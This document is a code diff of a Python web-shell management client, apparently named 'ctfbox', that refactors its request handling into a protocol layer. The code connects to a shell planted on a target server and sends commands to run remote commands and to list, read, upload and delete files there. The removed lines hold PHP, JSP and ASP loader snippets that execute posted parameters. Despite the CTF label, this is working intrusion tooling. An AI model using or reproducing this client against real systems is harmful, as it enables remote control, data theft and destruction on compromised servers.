@@ -28,103 +28,54 @@ shell 侧解码后执行，并将 `{"ok":bool,...}` 结果包裹在 MARKER 之�
 
 from __future__ import annotations
 
-import base64
 import json
 import sys
 import urllib.error
-import urllib.parse
 import urllib.request
 
-ARG_PARAM = "ctfbox_args"
-MARKER_START = "<<<CTFBOX>>>"
-MARKER_END = "<<</CTFBOX>>>"
+from protocols import Operation, get_protocol
+from protocols.ctfbox import ARG_PARAM, MARKER_END, MARKER_START  # 兼容旧测试端点
+
 TIMEOUT = 15
-SUPPORTED_PAYLOADS = ("php", "jsp", "asp", "aspx")
-SUPPORTED_ENCODERS = ("raw", "base64")
+DEFAULT_PROTOCOL = "ctfbox"
+
+__all__ = ["ARG_PARAM", "MARKER_START", "MARKER_END", "Session", "main"]
 
 
 # ---------------------------------------------------------------------------
-# loader 载荷：真实场景下由 shell 侧解释执行；测试用假端点会模拟其契约。
-# ---------------------------------------------------------------------------
-
-def loader_code(payload_type: str, arg_param: str) -> str:
-    """返回语言相关的 loader 代码，读取 arg_param 参数并回显 MARKER 包裹的结果。"""
-    if payload_type == "php":
-        return (
-            f"$a=$_POST['{arg_param}'];"
-            f"echo '{MARKER_START}';echo ctfbox_dispatch($a);echo '{MARKER_END}';"
-        )
-    if payload_type in ("asp", "aspx"):
-        return (
-            f"var a=Request.Form(\"{arg_param}\");"
-            f"Response.Write(\"{MARKER_START}\"+ctfbox_dispatch(a)+\"{MARKER_END}\");"
-        )
-    if payload_type == "jsp":
-        return (
-            f"String a=request.getParameter(\"{arg_param}\");"
-            f"out.print(\"{MARKER_START}\"+ctfboxDispatch(a)+\"{MARKER_END}\");"
-        )
-    raise ValueError(f"不支持的载荷类型：{payload_type}")
-
-
-def encode_args(args: dict, encoder: str) -> str:
-    """把动作参数编码进传输字段。"""
-    payload = json.dumps(args, ensure_ascii=False)
-    if encoder == "base64":
-        return base64.b64encode(payload.encode("utf-8")).decode("ascii")
-    return payload
-
-
-# ---------------------------------------------------------------------------
-# 会话
+# 会话：持有当前协议编解码器，负责一次 HTTP 往返。
 # ---------------------------------------------------------------------------
 
 class Session:
     def __init__(self) -> None:
-        self.target: str | None = None
-        self.password: str = ""
-        self.payload_type: str = "php"
-        self.encoder: str = "raw"
+        self.protocol = None  # type: ignore[assignment]
 
     @property
     def connected(self) -> bool:
-        return self.target is not None
+        return self.protocol is not None
 
-    def request(self, args: dict) -> dict:
-        """向目标发送一次动作请求，返回解析后的结果字典。"""
-        if self.target is None:
+    def open(self, **kwargs) -> None:
+        """按名字构造协议编解码器；kwargs 透传（protocol/target/password/...）。"""
+        name = kwargs.pop("protocol", DEFAULT_PROTOCOL) or DEFAULT_PROTOCOL
+        self.protocol = get_protocol(name, **kwargs)
+
+    def close(self) -> None:
+        self.protocol = None
+
+    def request(self, operation: str, params: dict) -> dict:
+        """向目标发送一次操作请求，返回协议解码后的规范结果。"""
+        if self.protocol is None:
             raise RuntimeError("尚未连接")
-        body = urllib.parse.urlencode(
-            {
-                self.password: loader_code(self.payload_type, ARG_PARAM),
-                ARG_PARAM: encode_args(args, self.encoder),
-            }
-        ).encode("utf-8")
+        body, headers = self.protocol.build_request(operation, params)
         req = urllib.request.Request(
-            self.target,
+            self.protocol.target,
             data=body,
             method="POST",
-            headers={"Content-Type": "application/x-www-form-urlencoded"},
+            headers=headers,
         )
         with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:  # noqa: S310 用户指定目标
-            raw = resp.read().decode("utf-8", errors="replace")
-        return self._parse(raw)
-
-    @staticmethod
-    def _parse(raw: str) -> dict:
-        start = raw.find(MARKER_START)
-        end = raw.find(MARKER_END, start + 1)
-        if start == -1 or end == -1:
-            raise RuntimeError("响应中未找到有效标记，可能不是有效的 shell")
-        inner = raw[start + len(MARKER_START):end].strip()
-        try:
-            result = json.loads(inner)
-        except json.JSONDecodeError as error:
-            raise RuntimeError(f"结果解析失败：{error}") from error
-        if not isinstance(result, dict) or not result.get("ok", False):
-            message = result.get("error", "shell 执行失败") if isinstance(result, dict) else "无效结果"
-            raise RuntimeError(str(message))
-        return result.get("data", {})
+            raw = resp.read()
+        return self.protocol.parse_response(operation, raw)
 
 
 # ---------------------------------------------------------------------------
@@ -145,20 +96,17 @@ def op_connect(session: Session, message: dict) -> None:
     target = message.get("target")
     if not isinstance(target, str) or not target:
         raise ValueError("缺少目标地址")
-    payload_type = message.get("payloadType", "php")
-    encoder = message.get("encoder", "raw")
-    if payload_type not in SUPPORTED_PAYLOADS:
-        raise ValueError(f"不支持的载荷类型：{payload_type}")
-    if encoder not in SUPPORTED_ENCODERS:
-        raise ValueError(f"不支持的编码器：{encoder}")
-    session.target = target
-    session.password = str(message.get("password", "pass"))
-    session.payload_type = payload_type
-    session.encoder = encoder
+    session.open(
+        protocol=message.get("protocol", DEFAULT_PROTOCOL),
+        target=target,
+        password=str(message.get("password", "pass")),
+        payload_type=message.get("payloadType", "php"),
+        encoder=message.get("encoder"),
+    )
     try:
-        info = session.request({"action": "sysinfo"})
+        info = session.request(Operation.SYSINFO, {})
     except Exception:
-        session.target = None
+        session.close()
         raise
     emit({"ev": "connected", "info": info})
 
@@ -167,13 +115,13 @@ def op_exec(session: Session, message: dict) -> None:
     cmd = message.get("cmd")
     if not isinstance(cmd, str) or not cmd:
         raise ValueError("缺少命令")
-    data = session.request({"action": "exec", "cmd": cmd})
+    data = session.request(Operation.EXEC, {"cmd": cmd})
     emit({"ev": "exec", "cmd": cmd, "output": data.get("output", "")})
 
 
 def op_ls(session: Session, message: dict) -> None:
     path = str(message.get("path", "."))
-    data = session.request({"action": "list", "path": path})
+    data = session.request(Operation.LIST, {"path": path})
     emit({"ev": "listing", "path": path, "entries": data.get("entries", [])})
 
 
@@ -181,7 +129,7 @@ def op_read(session: Session, message: dict) -> None:
     path = message.get("path")
     if not isinstance(path, str) or not path:
         raise ValueError("缺少文件路径")
-    data = session.request({"action": "read", "path": path})
+    data = session.request(Operation.READ, {"path": path})
     emit(
         {
             "ev": "file",
@@ -199,7 +147,7 @@ def op_upload(session: Session, message: dict) -> None:
         raise ValueError("缺少目标路径")
     if not isinstance(content, str):
         raise ValueError("缺少文件内容")
-    data = session.request({"action": "write", "path": path, "content": content})
+    data = session.request(Operation.WRITE, {"path": path, "content": content})
     emit(
         {
             "ev": "progress",
@@ -215,7 +163,7 @@ def op_delete(session: Session, message: dict) -> None:
     path = message.get("path")
     if not isinstance(path, str) or not path:
         raise ValueError("缺少目标路径")
-    session.request({"action": "delete", "path": path})
+    session.request(Operation.DELETE, {"path": path})
     emit({"ev": "progress", "stage": "delete", "path": path, "done": True})
 
 
@@ -233,7 +181,7 @@ def dispatch(session: Session, message: dict) -> bool:
     """执行一条操作，返回 False 表示应结束循环。"""
     op = message.get("op")
     if op == "disconnect":
-        session.target = None
+        session.close()
         emit({"ev": "progress", "stage": "disconnect", "done": True})
         return False
     handler = OPERATIONS.get(op)
